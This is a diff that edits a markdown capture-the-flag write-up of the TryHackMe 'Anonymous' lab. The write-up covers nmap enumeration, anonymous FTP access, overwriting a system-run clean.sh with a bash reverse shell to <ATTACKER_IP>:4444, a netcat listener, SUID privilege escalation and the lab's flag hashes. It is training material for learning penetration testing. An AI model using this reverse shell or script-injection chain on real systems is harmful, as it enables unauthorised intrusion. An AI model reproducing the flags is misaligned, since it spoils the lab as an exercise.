@@ -1,5 +1,4 @@
-
-# TryHackMe - Anonymous
+# Anonymous - TryHackMe
 
 Linux machine combining FTP anonymous access, a writable script executed by the system, and a SUID binary exploitable via GTFOBins. No credentials are needed at any stage - the entire chain runs on misconfigurations.
 
@@ -24,9 +23,9 @@ nmap -sC -sV -T4 <target_ip>
 ```
 **Key findings**:
 
-- FTP (21) — **Anonymous login enabled**
-- SMB (139, 445) — Guest access available
-- SSH (22) — Present but not required
+- FTP (21) - **Anonymous login enabled**
+- SMB (139, 445) - Guest access available
+- SSH (22) - Present but not required
 
 Although SMB enumeration was possible, it did not immediately provide a viable attack path.
 
@@ -61,7 +60,7 @@ Files of interest:
 **Critical Finding**
 A **writable script** (`clean.sh`) **executed by the system** is a direct path to Remote Code Execution.
 
-## Initial Access — Reverse Shell via Script Injection
+## Initial Access - Reverse Shell via Script Injection
 ### Payload Preparation
 The existing `clean.sh` script was overwritten with a reverse shell payload:
 
@@ -70,7 +69,7 @@ The existing `clean.sh` script was overwritten with a reverse shell payload:
 bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
 ```
 ### Upload via FTP
-```ftp
+```
 put clean.sh
 ```
 ### Listener on Attack Box
@@ -79,16 +78,13 @@ nc -lvnp 4444
 ```
 Once the script executed, a shell was obtained successfully.
 
-## Step 4 - Capturing the User Flag
-With shell access established:
+## Capturing the User Flag
+With shell access established, the user flag was read from the home directory:
 
 ```bash
 cat user.txt
 ```
-### User Flag:
-```bash
-90d6f992585815ff991e68748c414740
-```
+
 ## Privilege Escalation
 ### SUID Enumeration
 ```bash
@@ -112,21 +108,24 @@ whoami
 ```
 Output:
 
-```nginx
+```
 root
 ```
 Privilege escalation successful.
 
-## Step 6 - Capturing the Root Flag
+## Capturing the Root Flag
 ```bash
 cd /root
 cat root.txt
 ```
-### Root Flag:
 
-```bash
-4d930091c31a622a7ed10f27999af363
+## Flags
+
 ```
+user.txt  -> 90d6f992585815ff991e68748c414740
+root.txt  -> 4d930091c31a622a7ed10f27999af363
+```
+
 ## Key Takeaways
 - Anonymous FTP access combined with writable scripts is extremely dangerous
 - Enumeration should guide exploitation, not the other way around
